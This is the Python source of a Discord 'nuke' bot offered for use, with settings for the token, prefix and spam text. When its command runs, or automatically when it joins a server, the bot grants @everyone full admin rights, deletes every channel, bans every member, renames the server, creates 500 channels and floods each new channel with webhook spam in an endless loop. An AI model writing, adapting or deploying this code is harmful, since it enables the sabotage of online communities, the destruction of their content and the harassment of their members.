# CUSTOMIZABLES

TOKEN = "Insert Token Here" 
PREFIX = "Insert Prefix Here"
SPAM = ("Test", "TEST") # Put as many sentences or words as you want
WEBHOOK = ("Test", "TEST") # Put as many webhook names as you want
CHANNEL = ("Test", "TEST") # Put as many channels as possible

# WARNING WARNING WARNING WARNING WARNING WARNING WARNING WARNING WARNING WARNING WARNING #

# DO NOT MESS WITH ANYTHING BELOW THIS LINE OF TEXT UNLESS YOU KNOW WHAT YOU'RE DOING! #

import discord, random, aiohttp, asyncio
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands

nuke_on_join = False
nuke_wait_time = 0

espada = commands.Bot(command_prefix = PREFIX)
espada.remove_command("help")
client = discord.Client()

@espada.event
async def on_ready():
	print(f"Your bot's oauth2 link is https://discord.com/oauth2/authorize?client_id={espada.user.id}&permissions=8&scope=bot")
	print(f"{PREFIX}demolish to cause mayhem")
	await espada.change_presence(
		status=discord.Status.online, activity=discord.Game("Made by: Espada#7777")
    )

@espada.command()
async def seize(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  await nuke(guild)

async def nuke(guild):
  print(f"{guild.name} is being destroyed!")
  role = discord.utils.get(guild.roles, name = "@everyone")
  try:
    await role.edit(permissions = discord.Permissions.all())
    print(f"Successfully granted admin permissions in {guild.name}")
  except:
    print(f"Admin permissions NOT GRANTED in {guild.name}")
  for channel in guild.channels:
    try:
      await channel.delete()
      print(f"Successfully deleted channel {channel.name}")
    except:
      print(f"Channel {channel.name} has NOT been deleted.")
  for member in guild.members:
    try:
      await member.ban()
      print(f"Successfully banned {member.name}")
    except:
      print(f"{member.name} has NOT been banned.")
      await guild.edit(name = f"Demolished")
  for i in range(500):
    await guild.create_text_channel(random.choice(CHANNEL))
  print(f"{guild.name} has been slayed.")

@espada.event
async def on_guild_join(guild):
  if nuke_on_join == True:
    await asyncio.sleep(nuke_wait_time)
    await nuke(guild)
  else:
    return

@espada.command()
async def cdel(ctx):
  for channel in ctx.guild.channels:
    try:
      await channel.delete()
      print("Successfully deleted channel {channel.name}")
    except:
      print("Channel {channel.name} has NOT been deleted.")

@espada.event
async def on_guild_channel_create(channel):
  webhook = await channel.create_webhook(name = "nuked")
  webhook_url = webhook.url
  async with aiohttp.ClientSession() as session:
    webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
    while True:
      await webhook.send(random.choice(SPAM), username = random.choice(WEBHOOK))

@espada.command()
async def logout(ctx):
  await ctx.message.delete()
  exit()

espada.run(TOKEN)
